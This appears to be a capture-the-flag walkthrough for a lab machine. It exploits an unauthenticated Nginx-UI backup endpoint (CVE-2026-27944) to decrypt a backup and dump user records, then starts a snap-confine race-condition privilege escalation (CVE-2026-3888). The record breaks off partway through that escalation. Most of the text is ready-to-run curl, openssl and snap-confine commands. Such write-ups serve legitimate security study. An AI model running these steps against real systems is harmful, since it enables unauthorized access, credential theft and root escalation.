02 Foothold — CVE-2026-27944

CVE-2026-27944 — Nginx-UI ≤ 2.3.2 exposes /api/backup without authentication. Returns a full AES-256-CBC encrypted backup and leaks the decryption key in the X-Backup-Security response header as base64(key):base64(iv).

01
Download Backup & Extract Key CURL
bashKey Leaks in Header
curl -OJ -v http://admin.snapped.htb/api/backup

# Response header:
X-Backup-Security: /NppkytwKqHvSXSUiNE4tiDQ5wYuD9AD5dGjWSN/30s=:3K4fZn4rxHqwtHUfY7UQcQ==

key=$(echo '/NppkytwKqHvSXSUiNE4tiDQ5wYuD9AD5dGjWSN/30s=' | base64 -d | xxd -p -c 256)
iv=$(echo '3K4fZn4rxHqwtHUfY7UQcQ==' | base64 -d | xxd -p)
02
Decrypt Backup & Extract Database OPENSSL
bashDecrypt & Read DB
unzip backup.zip -d backup2 && cd backup2
openssl enc -aes-256-cbc -d \
  -in nginx-ui.zip -out nginxui_decrypted.zip \
  -K $key -iv $iv
unzip nginxui_decrypted.zip
sqlite3 database.db "select * from users;"

03 Privilege Escalation — CVE-2026-3888

CVE-2026-3888 — snap-confine (SUID-root) creates bind-mounts of /usr/lib/x86_64-linux-gnu via /tmp/.snap/. Between bind-mount steps, an attacker swaps the directory atomically via renameat2(RENAME_EXCHANGE), poisoning shared libraries in the namespace and enabling dynamic linker hijacking.

Snapd Version
2.63.1+24.04
Fixed In
2.74.2

4 minutes
01
Enter Sandbox — Anchor Namespace TERMINAL 1

Enter the Firefox snap sandbox and anchor the mount namespace in /tmp. Keep .snap alive with a touch loop.

bashTerminal 1
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
  --base core22 snap.firefox.hook.configure /bin/bash
cd /tmp && echo $$
# > 32512 (note this PID)

while test -d /tmp/.snap; do touch /tmp/; sleep 1; done
